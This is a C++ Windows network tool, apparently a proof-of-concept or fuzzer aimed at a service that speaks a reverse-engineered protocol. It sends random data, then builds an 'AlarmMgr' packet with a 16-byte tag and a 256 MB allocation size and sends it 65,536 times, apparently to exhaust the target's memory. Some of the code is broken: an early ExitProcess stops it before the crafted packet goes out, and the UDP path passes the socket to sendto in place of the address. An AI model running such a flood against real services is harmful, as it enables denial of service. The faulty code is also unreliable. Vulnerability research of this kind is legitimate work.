

#include <winsock2.h>
#include <Windows.h>
#include <string>
#include <iostream>
#include <Windows.h>
#include <Ws2tcpip.h>

using namespace std;

#pragma comment(lib,"ws2_32.lib")








#pragma pack(1)



struct Function_407F10_Param {
	char tag[16];	//数据包中16字节标记
	struct MyString* str;		//MyString结构体
	int flag;		//标记字段
};


struct NetworkParam {
	int unknown1;
	int flag;
	int tag;
	int unknown2;
	int unknown3;
	int event;
	int event1;
	int event2;

	int sock;		//32
	char* recvBuf;	//36
	int recvSize;	//40
	int recvBufSize;	//44
	char* sendBuf;	//48
	int sendSize;	//52
	int sendBufSize;//56

};

#pragma pack()


unsigned char g_tag[16] = {
	0xD5, 0xCF, 0xC7, 0xF8, 0x0B, 0xCD, 0xD3, 0x11, 0xAA, 0x10, 0x00, 0xA0, 0xC9, 0xEC, 0xFD, 0x9F
};


int __stdcall UdpClient(string ip, int port) {

	int ret = 0;
	SOCKET s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	if (s == INVALID_SOCKET) {
		perror("socket error\r\n");
		return -1;
	}

	sockaddr_in sa = { 0 };
	sa.sin_family = AF_INET;
	sa.sin_addr.S_un.S_addr = inet_addr(ip.c_str());
	sa.sin_port = ntohs(port);

	char sendBuf[0x1000];
	int sendLen = sendto(s, sendBuf, 0x1000, 0,(sockaddr*) & s, sizeof(sockaddr_in));

	char recvbuf[0x1000];
	int addrlen = sizeof(sockaddr_in);
	int recvlen = recvfrom(s, recvbuf, 0x1000, 0, (sockaddr*)&sa, &addrlen);
	if(recvlen <= 0) {
		perror("recvfrom error\r\n");
		return -1;
	}
	else {
		printf("recvfrom bytes:%d\r\n", recvlen);
	}
	closesocket(s);

	return 0;
}







int __stdcall TcpClient(string ip,int port) {

	int ret = 0;

	SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
	if (s == INVALID_SOCKET) {
		perror("socket\r\n");
		return -1;
	}

	sockaddr_in sa = { 0 };
	sa.sin_family = AF_INET;
	sa.sin_addr.S_un.S_addr = inet_addr(ip.c_str());
	sa.sin_port = ntohs(port);

	ret = connect(s, (sockaddr*)&sa, sizeof(sockaddr_in));
	if (ret < 0) {
		perror("connect\r\n");
		return -1;
	}
	int bufsize = 0x10000;
	char* sendbuf = new char[bufsize];

	char* recvbuf= new char[bufsize];
	
	srand(time(0));
	for (int k = 0; k < 1; k++) {
		
		sendbuf[0] = 0xff;
		for (int i = 0; i < 255; i++) {
			unsigned long v = rand() * k + i;
			sendbuf[i + 1] = (unsigned char)v;
		}

		ret = send(s, (char*)sendbuf, 256, 0);
		ExitProcess(0);
		if (ret <= 0) {

		}
		break;
	}
	

	const wchar_t* wstr = L"AlarmMgr";
	int wstrSize = wcslen(wstr);
	int pos = 1;
	memcpy(sendbuf + pos, g_tag, 16);
	pos += 16;
	memcpy(sendbuf + pos, "", 0);
	pos += 16;
	memcpy(sendbuf + pos, "", 0);
	pos += 4;

	wcscpy((wchar_t*)(sendbuf + pos), wstr);
	pos += wstrSize * 2 + 2;

	

	int allocSize = 0x10000000;

	*(unsigned long*)(sendbuf + pos) = allocSize;

	int packSize = pos - 1 + sizeof(long) + 16;

	sendbuf[0] = packSize;
	
	for (int k = 0; k < 0x10000; k++) {
		ret = send(s, (char*)sendbuf, packSize, 0);
	}
	
	int recvLen = recv(s, recvbuf, bufsize-1, 0);
	if (recvLen > 0 && recvLen < bufsize) {
		recvbuf[recvLen] = 0;
	}

	closesocket(s);

	delete [] sendbuf;

	delete[] recvbuf;
	
	return 0;
}


int __stdcall TcpServer(int port) {

	int ret = 0;

	SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (s == INVALID_SOCKET) {
		perror("socket error\r\n");
		return -1;
	}

	sockaddr_in sa = { 0 };
	sa.sin_family = AF_INET;
	sa.sin_addr.S_un.S_addr =0;
	sa.sin_port = ntohs(port);

	ret = bind(s, (sockaddr*)&sa, sizeof(sockaddr_in));
	if (ret) {
		perror("bind\r\n");
		return -1;
	}

	ret = listen(s, 16);

	int recvBufSize = 0x10000;
	char* recvbuf = new char[recvBufSize];

	while (1) {
		sockaddr_in client;
		int csize = sizeof(sockaddr_in);
		SOCKET sc = accept(s, (sockaddr*)&client, &csize);
		if (sc != INVALID_SOCKET) {
			
			int recvlen = recv(sc, recvbuf, recvBufSize-1, 0);
			if (recvlen <= 0 || recvlen >= recvBufSize) {
				closesocket(sc);
			}
			else {
				recvbuf[recvlen] = 0;

				int sendsize = send(sc, recvbuf, recvlen, 0);

				closesocket(sc);

			}
		}
		else {
			continue;
		}
	}
	return 0;
}




int main(int argc,char ** argv) {

	if (argc < 4) {
		printf("example:%s 192.168.1.2 443 6\r\n",argv[0]);
		return -1;
	}

	int ret = 0;
	WSADATA wsa = { 0 };
	ret = WSAStartup(0x0202, &wsa);
	if (ret) {
		perror("WSAStartup error\r\n");
		return -1;
	}

	char* ip = argv[1];
	int port = atoi(argv[2]);

	printf("ip:%s,port:%d\r\n", argv[1], port);

	if(_stricmp(argv[3],"tcp") == 0) {
		TcpClient(argv[1], port);
	}
	else if (_stricmp(argv[3], "udp") == 0) {
		UdpClient(argv[1], port);
	}
	else {
		int opt = atoi(argv[3]);
		if (opt == 6) {
			TcpClient(argv[1], port);
		}
		else if (opt == 17) {
			UdpClient(argv[1], port);
		}
	}

	printf("press any key to quit...\r\n");
	//ret = getchar();
	return 0;
}